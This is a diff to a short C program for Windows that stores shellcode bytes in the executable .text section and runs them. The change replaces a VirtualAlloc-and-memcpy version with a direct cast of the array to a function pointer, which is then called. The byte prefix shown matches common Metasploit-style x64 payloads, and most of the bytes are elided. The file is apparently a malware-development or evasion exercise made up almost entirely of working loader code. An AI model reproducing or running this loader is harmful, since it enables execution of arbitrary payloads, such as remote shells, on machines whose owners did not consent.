@@ -3,8 +3,8 @@
 
 #pragma section(".text")
 // Shellcode stored in the Text_RawData array
-__declspec(allocate(".text")) const unsigned char Text_RawData[] = {
-    // ... (shellcode bytes)
+__declspec(allocate(".text")) unsigned char Text_RawData[] = {
+	// ... (shellcode bytes)
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
 	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
 	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
@@ -31,29 +31,16 @@ __declspec(allocate(".text")) const unsigned char Text_RawData[] = {
 };
 
 int main() {
-    printf("[i] Text_RawData var : 0x%p \n", Text_RawData);
+	printf("[i] Text_RawData var : 0x%p \n", Text_RawData);
 
-    // Allocate a buffer for the shellcode to make it executable
-    void* executableBuffer = VirtualAlloc(NULL, sizeof(Text_RawData), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (executableBuffer == NULL) {
-        printf("Failed to allocate executable buffer.\n");
-        return 1;
-    }
+	// Declare a function pointer type that matches the shellcode signature
+	typedef void (*ShellcodeFunction)();
 
-    // Copy the shellcode to the executable buffer
-    memcpy(executableBuffer, Text_RawData, sizeof(Text_RawData));
+	// Cast the shellcode as a function pointer
+	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)Text_RawData;
 
-    // Declare a function pointer type that matches the shellcode signature
-    typedef void (*ShellcodeFunction)();
+	// Call the shellcode function
+	shellcodeFunc();
 
-    // Cast the executable buffer as a function pointer
-    ShellcodeFunction shellcodeFunc = (ShellcodeFunction)executableBuffer;
-
-    // Call the shellcode function
-    shellcodeFunc();
-
-    // Free the executable buffer
-    VirtualFree(executableBuffer, 0, MEM_RELEASE);
-
-    return 0;
+	return 0;
 }
